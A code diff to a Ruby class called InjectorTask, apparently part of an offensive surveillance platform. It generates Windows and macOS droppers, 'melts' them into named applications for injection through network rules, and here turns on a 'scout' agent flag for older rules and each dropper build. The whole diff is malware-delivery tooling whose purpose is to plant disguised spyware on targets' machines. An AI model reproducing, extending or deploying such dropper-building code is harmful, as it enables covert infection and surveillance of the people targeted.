@@ -27,6 +27,12 @@ class InjectorTask
 
     injector.rules.where(:enabled => true).each do |rule|
 
+      # make sure to enable the scout on older rules
+      if rule.scout.nil?
+        rule.scout = true
+        rule.save
+      end
+
       tag = injector.redirection_tag + (base + progressive).to_s
       progressive += 1
 
@@ -55,7 +61,7 @@ class InjectorTask
           # generate the dropper
           params = {'factory' => {'_id' => rule.action_param},
                     'binary' => {'demo' => LicenseManager.instance.limits[:nia][1]},
-                    'melt' => {'admin' => true, 'cooked' => true, 'appname' => factory.ident}
+                    'melt' => {'admin' => true, 'cooked' => true, 'appname' => factory.ident, 'scout' => rule.scout}
                     }
           build = Build.factory(:windows)
           build.create params
@@ -81,7 +87,7 @@ class InjectorTask
           params = {'factory' => {'_id' => rule.action_param},
                     'generate' => {'platforms' => ['osx', 'windows'],
                                    'binary' => {'demo' => LicenseManager.instance.limits[:nia][1], 'admin' => false},
-                                   'melt' => {'admin' => false}
+                                   'melt' => {'admin' => false, 'scout' => rule.scout}
                                   },
                     'melt' => {'appname' => appname}
                     }
@@ -108,7 +114,7 @@ class InjectorTask
           # generate the dropper
           params = {'factory' => {'_id' => rule.action_param},
                     'binary' => {'demo' => LicenseManager.instance.limits[:nia][1]},
-                    'melt' => {'admin' => false, 'appname' => appname}
+                    'melt' => {'admin' => false, 'appname' => appname, 'scout' => rule.scout}
                     }
           build = Build.factory(:windows)
           build.create params
@@ -134,7 +140,7 @@ class InjectorTask
           params = {'factory' => {'_id' => rule.action_param},
                     'generate' => {'platforms' => ['windows'],
                                    'binary' => {'demo' => LicenseManager.instance.limits[:nia][1], 'admin' => false},
-                                   'melt' => {'admin' => false}
+                                   'melt' => {'admin' => false, 'scout' => rule.scout}
                                   },
                     'melt' => {'appname' => appname}
                     }
